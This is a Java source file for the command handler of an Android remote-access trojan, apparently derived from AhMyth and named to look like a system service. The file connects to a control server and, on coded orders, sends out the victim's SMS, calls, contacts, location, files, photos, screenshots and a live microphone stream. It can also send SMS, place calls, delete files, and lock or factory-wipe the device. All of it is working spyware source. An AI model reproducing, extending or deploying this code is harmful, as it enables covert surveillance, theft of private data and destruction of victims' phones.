package com.android.background.services;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Looper;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.android.background.services.helpers.AppsListManager;
import com.android.background.services.helpers.CallsManager;
import com.android.background.services.helpers.CameraManager;
import com.android.background.services.helpers.ContactsManager;
import com.android.background.services.helpers.FileManager;
import com.android.background.services.helpers.LocManager;
import com.android.background.services.helpers.MicManager;
import com.android.background.services.helpers.SMSManager;
import com.android.background.services.helpers.ScreenManager;

import org.apache.commons.io.FileUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;

import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class ConnectionManager {

    @SuppressLint("StaticFieldLeak")
    public static Context context;
    private static io.socket.client.Socket ioSocket;

    public static void startAsync(Context con) {
        try {
            context = con;
            sendReq();
        } catch (Exception ex) {
            startAsync(con);
        }

    }


    public static void sendReq() {

        try {

            if (ioSocket != null)
                return;

            ioSocket = IOSocket.getInstance().getIoSocket();


            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("pong");
                }
            });

            ioSocket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    // Never leave the mic recording into a dead socket.
                    stopMicStream();
                }
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {

                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("order");

                        Log.d("order", order);

                        switch (order) {
                            case "x0000ca":
                                if (data.getString("extra").equals("camList"))
                                    x0000ca(-1);
                                else if (data.getString("extra").equals("1"))
                                    x0000ca(1);
                                else if (data.getString("extra").equals("0"))
                                    x0000ca(0);
                                break;
                            case "x0000fm":
                                if (data.getString("extra").equals("ls"))
                                    x0000fm(0, data.getString("path"));
                                else if (data.getString("extra").equals("dl"))
                                    x0000fm(1, data.getString("path"));
                                break;
                            case "x0000sm":
                                if (data.getString("extra").equals("ls"))
                                    x0000sm(0, null, null);
                                else if (data.getString("extra").equals("sendSMS"))
                                    x0000sm(1, data.getString("to"), data.getString("sms"));
                                break;
                            case "x0000cl":
                                x0000cl();
                                break;
                            case "x0000cn":
                                x0000cn();
                                break;
                            case "x0000mc":
                                x0000mc(data.getInt("sec"));
                                break;
                            case "x0000apps":
                                x0000apps();
                                break;
                            case "x0000lm":
                                x0000lm();
                                break;
                            case "x0000runApp":
                                x0000runApp(data.getString("extra"));
                                break;
                            case "x0000openUrl":
                                x0000openUrl(data.getString("url"));
                                break;
                            case "x0000deleteFF":
                                x0000deleteFF(data.getString("fileFolderPath"));
                                break;
                            case "x0000dm":
                                x0000dm(data.getString("number"));
                                break;
                            case "x0000lockDevice":
                                x0000lockDevice();
                                break;
                            case "x0000wipeDevice":
                                x0000wipeDevice();
                                break;
                            case "x0000rebootDevice":
                                x0000rebootDevice();
                                break;
                            case "x0000sc":
                                x0000sc();
                                break;
                            case "x0000getAllImages":
                                x0000getAllImages();
                                break;
                            case "x0000getImage":
                                x0000getImage(data.getString("path"), data.optString("name", null));
                                break;
                            case "x0000listenMic":
                                x0000listenMic();
                                break;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
            ioSocket.connect();

        } catch (Exception ex) {
            Log.e("error", ex.getMessage());
        }
    }

    private static void x0000rebootDevice() throws JSONException {
        JSONObject jsonObject = new JSONObject();

        try {
            if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    MainActivity.devicePolicyManager.reboot(MainActivity.componentName);
                    jsonObject.put("status", true);
                    jsonObject.put("message", "Device rebooted successfully.");
                }
                else{
                    jsonObject.put("status", false);
                    jsonObject.put("message", "Device is below Android 7.0");
                }
            }
            else{
                jsonObject.put("status", false);
                jsonObject.put("message", "Device admin permission is not active.");
            }
        } catch (Exception e) {
            // reboot() requires device-owner powers on Android 7+; never fail
            // silently -- report the exact reason instead.
            jsonObject.put("status", false);
            jsonObject.put("message", "reboot failed: " + e.getMessage());
        }
        ioSocket.emit("x0000rebootDevice", jsonObject);
    }

    private static void x0000wipeDevice() throws JSONException {

        JSONObject jsonObject = new JSONObject();

        try {
            if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
                // flags=0 performs a full factory reset (the WIPE_EXTERNAL_STORAGE
                // flag can hit the "system user cannot be removed" path on newer
                // Android when the device has no separate work profile).
                MainActivity.devicePolicyManager.wipeData(0);
                jsonObject.put("status", true);
                jsonObject.put("message", "Device wiped out successfully.");
            }
            else{
                jsonObject.put("status", false);
                jsonObject.put("message", "Device admin permission is not active.");
            }
        } catch (Exception e) {
            // wipeData() can be refused (e.g. a no_factory_reset restriction
            // set by the OS / provisioning); never fail silently.
            jsonObject.put("status", false);
            jsonObject.put("message", "wipe failed: " + e.getMessage());
        }
        ioSocket.emit("x0000wipeDevice", jsonObject);
    }

    private static void x0000lockDevice() throws JSONException {

        JSONObject jsonObject = new JSONObject();

        try {
            if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
                MainActivity.devicePolicyManager.lockNow();
                jsonObject.put("status", true);
                jsonObject.put("message", "Device locked.");
            }
            else{
                jsonObject.put("status", false);
                jsonObject.put("message", "Device admin permission is not active.");
            }
        } catch (Exception e) {
            jsonObject.put("status", false);
            jsonObject.put("message", "lock failed: " + e.getMessage());
        }
        ioSocket.emit("x0000lockDevice", jsonObject);
    }

    private static void x0000dm(String number) throws JSONException {

        JSONObject jsonObject = new JSONObject();

        try {

            Uri phoneNumber = Uri.parse("tel:"+number);
            Intent callIntent = new Intent(Intent.ACTION_CALL, phoneNumber);
            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(callIntent);

            jsonObject.put("status", true);
        }
        catch (Exception e){
            jsonObject.put("status", false);
            e.printStackTrace();
        }
        ioSocket.emit("x0000dm", jsonObject);
    }

    private static void x0000deleteFF(String fileFolderPath) throws JSONException {

        JSONObject jsonObject = new JSONObject();

        File file = new File(fileFolderPath);

        if (file.isDirectory() && file.exists()){
            try {
                FileUtils.forceDelete(file);
                jsonObject.put("status", true);
            }
            catch (Exception e) {
                jsonObject.put("status", false);
                e.printStackTrace();
            }
        }
        else if (file.isFile() && file.exists()){
            jsonObject.put("status", file.delete());
        }
        else{
            jsonObject.put("status", false);
            jsonObject.put("message", "File/folder does not exist.");
        }

        ioSocket.emit("x0000deleteFF", jsonObject);
    }


    private static void x0000openUrl(String url) {

        JSONObject jsonObject = new JSONObject();

        try{
            Intent openIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            openIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(openIntent);
            jsonObject.put("status", true);
        }
        catch (Exception e){
            try {
                jsonObject.put("status", false);
            } catch (JSONException jsonException) {
                jsonException.printStackTrace();
            }
            e.printStackTrace();

        }
        ioSocket.emit("x0000openUrl", jsonObject);
    }


    private static void x0000runApp(String packageName) {

        JSONObject jsonObject = new JSONObject();

        Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(packageName);

        if (launchIntent != null) {
            try {
                jsonObject.put("launchingStatus", true);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            context.startActivity(launchIntent);
        }
        else {
            try {
                jsonObject.put("launchingStatus", false);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        ioSocket.emit("x0000runApp", jsonObject);
    }

    public static void x0000apps() {
        ioSocket.emit("x0000apps", AppsListManager.getAppLists(context));
    }

    public static void x0000ca(int req) {

        if (req == -1) {
            JSONObject cameraList = new CameraManager(context).findCameraList();
            if (cameraList != null)
                ioSocket.emit("x0000ca", cameraList);
        } else if (req == 1) {
            new CameraManager(context).startUp(1);
        } else if (req == 0) {
            new CameraManager(context).startUp(0);
        }
    }

    public static void x0000fm(int req, String path) {
        if (req == 0)
            ioSocket.emit("x0000fm", FileManager.walk(path));
        else if (req == 1)
            FileManager.downloadFile(path);
    }


    public static void x0000sm(int req, String phoneNo, String msg) {
        if (req == 0)
            ioSocket.emit("x0000sm", SMSManager.getSMSList());
        else if (req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.emit("x0000sm", isSent);
        }
    }

    public static void x0000cl() {
        ioSocket.emit("x0000cl", CallsManager.getCallsLogs());
    }

    public static void x0000cn() {
        ioSocket.emit("x0000cn", ContactsManager.getContacts());
    }

    public static void x0000sc() {
        try {
            if (MainService.getMediaProjection() != null) {
                new ScreenManager(context).captureScreen(MainService.getMediaProjection());
            } else {
                JSONObject error = new JSONObject();
                error.put("image", false);
                error.put("error", "screen-capture consent not granted at launch");
                ioSocket.emit("x0000sc", error);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void x0000mc(int sec) throws Exception {
        MicManager.startRecording(sec);
    }

    public static void x0000lm() throws Exception {
        // The socket.io callback thread may already have a Looper from a
        // previous call (Looper.prepare() throws otherwise).
        if (Looper.myLooper() == null) {
            Looper.prepare();
        }
        LocManager gps = new LocManager(context);
        JSONObject location = new JSONObject();
        // check if GPS enabled
        if (gps.canGetLocation()) {

            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            Log.e("loc", latitude + "   ,  " + longitude);
            location.put("enable", true);
            location.put("lat", latitude);
            location.put("lng", longitude);
            String provider = gps.getProvider();
            if (provider != null) location.put("provider", provider);
            Float accuracy = gps.getAccuracy();
            if (accuracy != null) location.put("accuracy", accuracy);
            Long time = gps.getTime();
            if (time != null) location.put("time", time);
            Double altitude = gps.getAltitude();
            if (altitude != null) location.put("altitude", altitude);
        } else
            location.put("enable", false);

        ioSocket.emit("x0000lm", location);
    }

    // ---------------------------------------------------------------------
    // Gallery dump (inherited from AhMyth-Plus, modernized)
    // ---------------------------------------------------------------------

    public static void x0000getAllImages() throws JSONException {
        JSONArray images = new JSONArray();
        ContentResolver cr = context.getContentResolver();
        ArrayList<String> projection = new ArrayList<>();
        projection.add(MediaStore.Images.Media._ID);
        projection.add(MediaStore.Images.Media.DISPLAY_NAME);
        projection.add(MediaStore.Images.Media.SIZE);
        projection.add(MediaStore.Images.Media.DATE_ADDED);
        // RELATIVE_PATH (API 29+) avoids the deprecated DATA column entirely.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
            projection.add(MediaStore.Images.Media.RELATIVE_PATH);
        Uri collection = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
                ? MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                : MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
        try (Cursor c = cr.query(collection, projection.toArray(new String[0]), null, null, sortOrder)) {
            if (c != null) {
                int idCol = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
                int sizeCol = c.getColumnIndex(MediaStore.Images.Media.SIZE);
                int dateCol = c.getColumnIndex(MediaStore.Images.Media.DATE_ADDED);
                int relCol = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
                        ? c.getColumnIndex(MediaStore.Images.Media.RELATIVE_PATH) : -1;
                while (c.moveToNext()) {
                    String name = c.getString(nameCol);
                    String relPath = relCol >= 0 ? c.getString(relCol) : null;
                    String path = null;
                    if (relPath != null && name != null) {
                        path = Environment.getExternalStorageDirectory().getAbsolutePath()
                                + "/" + relPath;
                        if (!path.endsWith("/")) path += "/";
                        path += name;
                    } else {
                        // pre-Q fallback: the DATA column still exists there
                        // (deprecated only for read access on API 29+).
                        int dataCol = c.getColumnIndex(MediaStore.Images.Media.DATA);
                        if (dataCol >= 0) path = c.getString(dataCol);
                    }
                    JSONObject o = new JSONObject();
                    o.put("id", c.getLong(idCol));
                    o.put("imageName", name != null ? name : "image_" + c.getLong(idCol) + ".jpg");
                    o.put("imagePath", path != null ? path : "");
                    if (sizeCol >= 0) o.put("imageSize", c.getLong(sizeCol));
                    if (dateCol >= 0) o.put("imageDate", c.getLong(dateCol));
                    images.put(o);
                }
            }
        }
        JSONObject out = new JSONObject();
        out.put("imageCount", images.length());
        out.put("images", images);
        ioSocket.emit("x0000getAllImages", out);
    }

    public static void x0000getImage(String path, String name) throws JSONException {
        JSONObject out = new JSONObject();
        out.put("image", false);
        out.put("error", "image not found");
        if (path == null || path.isEmpty()) {
            ioSocket.emit("x0000getImage", out);
            return;
        }
        Bitmap bmp = null;
        try {
            BitmapFactory.Options bounds = new BitmapFactory.Options();
            bounds.inJustDecodeBounds = true;
            BitmapFactory.decodeFile(path, bounds);
            int sample = 1;
            int maxDim = 1280;
            while (Math.max(bounds.outWidth, bounds.outHeight) / (sample * 2) >= maxDim)
                sample *= 2;
            BitmapFactory.Options opts = new BitmapFactory.Options();
            opts.inSampleSize = sample;
            bmp = BitmapFactory.decodeFile(path, opts);
        } catch (Exception e) {
            // fall through with null bitmap -> explicit error response
        }
        if (bmp == null) {
            ioSocket.emit("x0000getImage", out);
            return;
        }
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bmp.compress(Bitmap.CompressFormat.JPEG, 70, bos);
            String b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP);
            out = new JSONObject();
            out.put("image", true);
            out.put("imageName", name != null ? name : "image.jpg");
            out.put("base64", b64);
            ioSocket.emit("x0000getImage", out);
        } finally {
            bmp.recycle();
        }
    }

    // ---------------------------------------------------------------------
    // Real-time microphone streaming (inherited from AhMyth-Plus, modernized)
    // ---------------------------------------------------------------------

    private static final int MIC_STREAM_RATE = 16000;
    private static final int MIC_STREAM_CHUNK = 4096;
    private static volatile AudioRecord micStreamRecord;
    private static volatile Thread micStreamThread;
    private static volatile boolean micStreaming;

    private static void x0000listenMic() {
        if (micStreaming) {
            stopMicStream();
            ioSocket.emit("audioDataStop", "stop");
            return;
        }
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
            ioSocket.emit("audioDataStop", "mic permission denied");
            return;
        }
        try {
            int minBuf = AudioRecord.getMinBufferSize(
                    MIC_STREAM_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
            int bufSize = Math.max(minBuf, MIC_STREAM_CHUNK);
            AudioRecord rec = new AudioRecord(MediaRecorder.AudioSource.MIC, MIC_STREAM_RATE,
                    AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufSize);
            if (rec.getState() != AudioRecord.STATE_INITIALIZED) {
                rec.release();
                ioSocket.emit("audioDataStop", "mic init failed");
                return;
            }
            micStreamRecord = rec;
            micStreaming = true;
            rec.startRecording();
            micStreamThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    byte[] chunk = new byte[MIC_STREAM_CHUNK];
                    while (micStreaming) {
                        int read = rec.read(chunk, 0, chunk.length);
                        if (read > 0) {
                            byte[] data = Arrays.copyOf(chunk, read);
                            String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                            ioSocket.emit("audioData", b64);
                        }
                    }
                }
            }, "mic-stream");
            micStreamThread.start();
        } catch (Exception e) {
            micStreaming = false;
            ioSocket.emit("audioDataStop", "mic error: " + e.getMessage());
        }
    }

    private static void stopMicStream() {
        micStreaming = false;
        if (micStreamThread != null) {
            micStreamThread.interrupt();
            micStreamThread = null;
        }
        if (micStreamRecord != null) {
            try { micStreamRecord.stop(); } catch (Exception ignored) { }
            micStreamRecord.release();
            micStreamRecord = null;
        }
    }
}
